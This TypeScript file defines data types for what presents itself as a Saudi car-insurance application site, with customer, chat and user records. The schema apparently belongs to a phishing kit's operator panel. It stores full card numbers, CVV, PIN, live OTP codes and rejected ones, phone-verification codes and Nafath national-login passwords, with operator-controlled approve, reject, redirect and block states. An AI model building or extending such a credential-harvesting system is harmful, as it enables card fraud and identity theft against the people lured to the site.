export interface InsuranceApplication {
    id?: string
    country:string,
    // Step 1: Basic Information
    identityNumber: string
    ownerName: string
    phoneNumber: string
    documentType: "استمارة" | "بطاقة جمركية"
    serialNumber: string
    insuranceType: "تأمين جديد" | "نقل ملكية"
    buyerName?: string  // اسم المشتري (فقط في حالة نقل ملكية)
    buyerIdNumber?: string  // رقم هوية المشتري (فقط في حالة نقل ملكية)
    
    // Step 2: Insurance Details
    insuranceCoverage: string
    insuranceStartDate: string
    vehicleUsage: string
    vehicleValue: string | number
    vehicleYear: string
    vehicleModel: string
    repairLocation: "agency" | "workshop"
  
    // Step 3: Selected Offer
    selectedOffer?: {
      id: number
      company: string
      price: number
      type: string
      features: string[]
    }
  
    // Step 4: Payment
    paymentMethod?: string
    cardNumber?: string
    cardType?: string
    expiryDate?: string
    cvv?: string
    bankInfo?: {
      name: string
      country: string
    }
    paymentStatus: "pending" | "completed" | "failed"
    cardStatus?: "waiting" | "pending" | "approved_with_otp" | "approved_with_pin" | "rejected"
    otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | ""
    pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending"
    otpCode?: string
    otp?: string // كود OTP (الحقل المستخدم من موقع الزوار)
    oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
    pinCode?: string
    originalPrice?: number
    discount?: number
    finalPrice?: number
    offerTotalPrice?: number
  
    // Verification fields for phone and ID card codes
    phoneVerificationCode?: string
    phoneOtp?: string // كود تحقق الهاتف (الحقل الفعلي المستخدم)
    phoneOtpSubmittedAt?: string
    allPhoneOtps?: string[]
    phoneVerificationStatus?: "pending" | "approved" | "rejected"
    phoneVerifiedAt?: Date
    phoneOtpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "show_phone_otp" | ""
    phoneCarrier?: string // شركة الاتصالات
    idVerificationCode?: string
    idVerificationStatus?: "pending" | "approved" | "rejected"
    idVerifiedAt?: Date
    lastSeen?:string
    
    // Nafad fields
    nafazId?: string
    nafazPass?: string
    nafadConfirmationCode?: string
    nafadConfirmationStatus?: "pending" | "approved" | "rejected"
    // Metadata
    currentStep: number | "home" | "payment" | "phone" | "nafad"
    currentPage?: string
    
    // Visitor Tracking
    referenceNumber?: string
    deviceType?: string
    browser?: string
    os?: string
    screenResolution?: string
    isOnline?: boolean
    isBlocked?: boolean
    lastActiveAt?: string
    sessionStartAt?: string
    
    // Redirect Control
    redirectPage?: string | null
    redirectRequestedAt?: string
    redirectRequestedBy?: string
    redirectedAt?: string
    
    // Page Timestamps
    homeVisitedAt?: string
    homeCompletedAt?: string
    homeUpdatedAt?: string
    insurVisitedAt?: string
    insurCompletedAt?: string
    insurUpdatedAt?: string
    comparVisitedAt?: string
    comparCompletedAt?: string
    comparUpdatedAt?: string
    checkVisitedAt?: string
    checkCompletedAt?: string
    checkUpdatedAt?: string
    
    // Bubble Timestamps - track last update for each data section
    basicInfoUpdatedAt?: string      // معلومات أساسية
    nafadUpdatedAt?: string          // نفاذ
    insuranceUpdatedAt?: string      // تفاصيل التأمين
    offerUpdatedAt?: string          // العرض المختار
    cardUpdatedAt?: string           // معلومات البطاقة
    otpUpdatedAt?: string            // OTP
    pinUpdatedAt?: string            // PIN
    phoneUpdatedAt?: string          // معلومات الهاتف
    phoneOtpUpdatedAt?: string       // كود تحقق الهاتف
    
    status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
    assignedProfessional?: string
    createdAt: Date
    updatedAt: Date
    notes?: string
    isUnread?: boolean
    online?: boolean
    selectedFeatures?: string[]
    history?: Array<{
      id: string
      type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad"
      timestamp: string
      status: "pending" | "approved" | "rejected"
      data: any
    }>
  }
  
  export interface ChatMessage {
    id?: string
    applicationId: string
    senderId: string
    senderName: string
    senderRole: "customer" | "professional" | "admin"
    message: string
    timestamp: Date
    read: boolean
  }
  
  export interface User {
    id: string
    email: string
    name: string
    role: "customer" | "professional" | "admin"
    createdAt: Date
  }
  